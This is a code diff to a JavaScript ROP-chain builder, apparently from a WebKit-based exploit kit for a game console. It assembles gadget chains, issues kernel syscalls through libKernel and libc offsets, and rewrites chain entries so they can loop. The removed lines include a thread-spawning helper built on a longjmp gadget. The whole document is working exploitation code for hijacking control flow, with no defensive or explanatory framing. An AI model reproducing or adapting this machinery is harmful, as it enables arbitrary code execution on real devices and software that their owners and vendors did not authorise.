@@ -5,13 +5,14 @@ const stack_reserved_idx = reserve_upper_stack / 4;
 
 // Class for quickly creating and managing a ROP chain
 window.rop = function () {
-  this.stackback = p.malloc32(stack_sz / 4 + 0x8);
+  this.stackback = p.malloc32(stack_sz / 4);
   this.stack = this.stackback.add32(reserve_upper_stack);
   this.stack_array = this.stackback.backing;
-  this.retval = this.stackback.add32(stack_sz);
+  this.retval = this.stack.add32(0x3FFF8);
   this.count = 1;
   this.branches_count = 0;
   this.branches_rsps = p.malloc(0x200);
+  this.useless_buffer = p.malloc(8);
 
   this.clear = function () {
     this.count = 1;
@@ -84,17 +85,6 @@ window.rop = function () {
     return this;
   }
 
-  this.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
-    this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
-    this.write_result(this.retval);
-    this.run();
-    return p.read8(this.retval);
-  }
-
-  this.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-    return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
-  }
-
   //get rsp of the next push
   this.get_rsp = function () {
     return this.stack.add32(this.count * 8);
@@ -104,14 +94,10 @@ window.rop = function () {
     this.push(where);
     this.push(gadgets["mov [rdi], rax"]);
   }
-  this.write_result4 = function (where) {
-    this.push(gadgets["pop rdi"]);
-    this.push(where);
-    this.push(gadgets["mov [rdi], eax"]);
-  }
-  
-  //use this in loops.
-  this.syscall_safe = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
+
+  //when looping over the same chain you have to keep in mind some code pushes shit on the stack (overwriting the chain), you could either have your stack be somewhere in the middle of a buffer(so that it can go up and down) and at the end of your chain have it write itself again
+  //syscalls however don't push much so you can restore them just fine without a lot of shit
+  this.syscall_fix = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
     if (rdi != undefined) {
       this.push(gadgets["pop rdi"]);
       this.push(rdi);
@@ -143,13 +129,17 @@ window.rop = function () {
     }
     var sysc_restore = this.get_rsp();
     this.push(window.syscalls[sysc]);
-    this.push_write8(sysc_restore, window.syscalls[sysc]);
+    this.push(window.gadgets["pop rdi"]);
+    this.push(sysc_restore);
+    this.push(window.gadgets["pop rsi"]);
+    this.push(window.syscalls[sysc]);
+    this.push(window.gadgets["mov [rdi], rsi"]);
   }
   this.jmp_rsp = function (rsp) {
     this.push(window.gadgets["pop rsp"]);
     this.push(rsp);
   }
-  
+
   this.create_equal_branch = function (value_addr, compare_value) {
     var branch_addr_spc = this.branches_rsps.add32(this.branches_count * 0x10);
     this.branches_count++;
@@ -291,36 +281,16 @@ window.rop = function () {
 
     return branch_addr_spc;
   }
+
   this.set_branch_points = function (branch_addr_sp, rsp_condition_met, rsp_condition_not_met) {
     p.write8(branch_addr_sp.add32(0x0), rsp_condition_met);
     p.write8(branch_addr_sp.add32(0x8), rsp_condition_not_met);
   }
-  this.spawn_thread = function(name, chain_setup) {
-    var new_thr = new rop();
-    var context = p.malloc(0x1b8);
-    var arg = context.add32(0x100);
-
-    p.write8(context.add32(0x0), window.gadgets["ret"]);
-    p.write8(context.add32(0x10), new_thr.stack);
-    new_thr.push(window.gadgets["ret"]);
-    chain_setup(new_thr);
-
-    p.write8(arg.add32(0xB0), context);
-    p.write8(arg.add32(0x70), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)); // longjmp
-    //mov rdx, qword ptr [rdi + 0xb0]; call qword ptr [rdi + 0x70];
-
-    var retv = function () {
-      chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np), context.add32(0x48), 0, webKitBase.add32(OFFSET_WK_longjmp_gadget_thread), arg, p.stringify(name));
-    }
-    window.nogc.push(new_thr);
-    window.nogc.push(context);
-
-    return retv;
-  }
 
   this.run = function () {
-    p.launch_chain(this);
+    var retv = p.loadchain(this);
     this.clear();
+    return retv;
   }
 
   return this;
